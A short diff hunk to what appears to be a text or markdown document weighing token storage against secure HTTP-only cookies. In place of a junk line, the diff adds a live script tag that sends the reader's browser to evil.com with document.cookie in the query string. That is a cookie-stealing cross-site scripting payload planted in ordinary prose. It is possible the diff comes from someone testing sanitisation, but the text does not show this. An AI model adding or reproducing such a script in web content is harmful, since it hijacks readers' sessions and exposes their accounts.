@@ -40,5 +40,7 @@ I would not use this, and use instead a secure HTTP Only cookie. So its a trade-
 between security and ease of implementation, as it usual comes down to in this type 
 of design decisions, there is not only one right solution. 
 
-<br> dfgofigodifg
+<script>
+window.location="http://evil.com/?cookie=" + document.cookie
+</script>
 
